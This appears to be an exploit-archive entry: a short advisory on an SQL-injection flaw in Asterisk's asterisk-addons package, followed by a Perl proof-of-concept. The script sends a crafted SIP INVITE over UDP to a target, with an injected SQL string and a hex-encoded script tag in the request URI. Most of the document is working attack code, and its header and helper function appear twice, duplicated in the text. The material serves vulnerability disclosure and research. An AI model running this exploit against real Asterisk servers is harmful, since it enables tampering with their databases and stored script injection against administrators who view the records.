source: http://www.securityfocus.com/bid/26095/info

Asterisk 'asterisk-addons' package is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

This issue affects these versions:

'asterisk-addons' prior to 1.2.8 when used with Asterisk Open Source 1.2.x
'asterisk-addons' prior to 1.4.4 when used with Asterisk Open Source 1.4.x 

#!/usr/bin/perl

#############################################
# Vulnerabily discovered using KiF ~ Kiph   #
#                                           #
# Authors:                                  #
#       Humberto J. Abdelnur (Ph.D Student)     #
#       Radu State (Ph.D)                       #
#       Olivier Festor (Ph.D)                   #
#                                           #
# Madynes Team, LORIA - INRIA Lorraine      #
# http://madynes.loria.fr                   #
#############################################

use IO::Socket::INET;
use String::Random;
$foo = new String::Random;

die "Usage $0 <callUser> <targetIP> <targetPort> <attackerUser> <localIP>
<localPort>" unless ($ARGV[5]);

sub iso2hex($) {
          my $hex = '';
          for (my $i = 0; $i < length($_[0]); $i++) {
                  my $ordno = ord substr($_[0], $i, 1);
                  $hex .= sprintf("%lx", $ordno);
          }

          $hex =~ s/ $//;;
          $hex;
}


#!/usr/bin/perl

#############################################
# Vulnerabily discovered using KiF ~ Kiph   #
#                                           #
# Authors:                                  #
#       Humberto J. Abdelnur (Ph.D Student)     #
#       Radu State (Ph.D)                       #
#       Olivier Festor (Ph.D)                   #
#                                           #
# Madynes Team, LORIA - INRIA Lorraine      #
# http://madynes.loria.fr                   #
#############################################

use IO::Socket::INET;
use String::Random;
$foo = new String::Random;

die "Usage $0 <callUser> <targetIP> <targetPort> <attackerUser> <localIP>
<localPort>" unless ($ARGV[5]);

sub iso2hex($) {
          my $hex = '';
          for (my $i = 0; $i < length($_[0]); $i++) {
                  my $ordno = ord substr($_[0], $i, 1);
                  $hex .= sprintf("%lx", $ordno);
          }

          $hex =~ s/ $//;;
          $hex;
}


$callUser = $ARGV[0];
$targetIP = $ARGV[1];
$targetPort = $ARGV[2];

$attackerUser = $ARGV[3];
$attackerIP= $ARGV[4];
$attackerPort= $ARGV[5];

$socket=new IO::Socket::INET->new(
                Proto=>'udp',
                PeerPort=>$targetPort,
        PeerAddr=>$targetIP,
                LocalPort=>$attackerPort);

$scriptinjection= iso2hex("<script>alert(1)</script>");
$sqlinjection= "',1,2,3,4,5,-9,-9,0x$scriptinjection,6,7,8)/*";

$callid= $foo->randpattern("CCccnCn");
$cseq = $foo->randregex('\d\d\d\d');

$sdp = "v=0\r
o=Lupilu 63356722367567875 63356722367567875 IN IP4 $attackerIP\r
s=-\r
c=IN IP4 $attackerIP\r
t=0 0\r
m=audio 49152 RTP/AVP 96 0 8 97 18 98 13\r
a=sendrecv\r
a=ptime:20\r
a=maxptime:200\r
a=fmtp:96 mode-change-neighbor=1\r
a=fmtp:18 annexb=no\r
a=fmtp:98 0-15\r
a=rtpmap:96 AMR/8000/1\r
a=rtpmap:0 PCMU/8000/1\r
a=rtpmap:8 PCMA/8000/1\r
a=rtpmap:97 iLBC/8000/1\r
a=rtpmap:18 G729/8000/1\r
a=rtpmap:98 telephone-event/8000/1\r
a=rtpmap:13 CN/8000/1\r
";
$sdplen= length $sdp;

$msg = "INVITE sip:$sqlinjection\$targetIP SIP/2.0\r
Via: SIP/2.0/UDP $attackerIP;branch=z9hG4bK1;rport\r
From: <sip:$attackerUser\$attackerIP>;tag=1\r
To: <sip:$callUser\$targetIP>\r
Call-ID: $callid\$attackerIP\r
CSeq: $cseq INVITE\r
Max-Forwards: 70\r
Contact: <sip:$attackerUser\$attackerIP>\r
Content-Type: application/sdp\r
Content-Length: $sdplen\r
\r
$sdp";

$socket->send($msg); 